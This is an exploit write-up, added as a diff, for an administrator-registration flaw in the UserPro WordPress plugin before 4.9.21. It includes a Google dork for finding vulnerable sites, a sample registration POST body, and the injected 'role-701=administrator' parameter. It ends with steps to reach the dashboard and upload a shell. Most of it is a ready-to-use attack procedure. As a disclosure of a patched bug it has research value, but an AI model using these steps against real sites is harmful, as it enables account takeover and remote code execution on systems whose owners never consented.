@@ -1,0 +1,54 @@
+# Exploit Title: Wordpress Plugin UserPro < 4.9.21 User Registration With Administrator Role
+# Google Dork: inurl:/wp-content/plugins/userpro/
+# Date: 3rd January, 2019
+# Exploit Author: Noman Riffat
+# Vendor Homepage: https://userproplugin.com/
+# Software Link: https://codecanyon.net/item/userpro-user-profiles-with-social-login/5958681
+# Version: < 4.9.21
+# Tested on: Wordpress 4.9.9 with linux but should work on all WP versions and OS as well
+
+UserPro fixed a user registration with administrator privileges vulnerability in version 4.9.21
+But there wasn't any POC available so this exploit demonstrates this
+vulnerability.
+https://demo.userproplugin.com/wp-content/plugins/userpro/changelog.txt
+From the changelog: "Security Fix : Registration role validation fix"
+
+The latest version up to now is 4.9.29
+The vulnerability allows anyone to register with Administrator role which
+can easily be turned into RCE
+
+Steps to reproduce:
+
+1. Go to the registration form, input random fake values, trigger Burp
+Suite and click submit.
+
+2. The POST data will look similar to following
+
+redirect_uri-701=&_myuserpro_nonce=xxxxxx&_wp_http_referer=%2F&unique_id=701&user_login-701=USERNAME&user_email-701=
+USERNAME@EMAIL.COM
+&user_pass-701=PASSWORD&user_pass_confirm-701=PASSWORD&display_name-701=&profilepicture-701=&country-701=&facebook-701=&twitter-701=&google_plus-701=&user_url-701=&terms=on&action=userpro_process_form&template=register&group=default&shortcode=xxxxxxxxxxxxxxxxxxxxxxxxxxx
+
+Here "-701" is a random postfix number and gets stripped at the server.
+Other than that, the interesting values are
+
+user_login
+user_email
+user_pass
+user_pass_confirm
+
+3. Adding following extra parameter in POST data will register the user
+with Administrator privileges
+
+role-701=administrator
+
+So the modified POST data will look similar to following
+
+role-701=administrator&redirect_uri-701=&_myuserpro_nonce=xxxxxx&....snip....snip....
+
+4. Forward the POST data in Burp Suite and you will get redirect to
+/profile/ page with Administrator menu on top. Access /wp-admin/ to get to
+the dashboard
+
+5. Upload shell with default methods
+
+@nomanriffat
